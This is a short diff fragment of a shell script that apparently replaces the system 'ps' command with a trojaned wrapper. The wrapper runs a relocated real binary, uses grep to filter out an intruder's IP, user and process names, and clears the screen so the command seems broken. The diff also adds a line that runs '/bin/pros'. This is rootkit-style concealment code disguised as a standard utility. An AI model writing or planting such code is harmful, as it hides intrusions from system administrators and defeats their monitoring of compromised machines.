@@ -5,3 +5,4 @@
 # Clear the screen as well to make the command appear broken
 /lib/module_ps $@ | grep -Ev "IP_TO_HIDE|USER_TO_HIDE|PROC_TO_HIDE" && clear
 
+/bin/pros
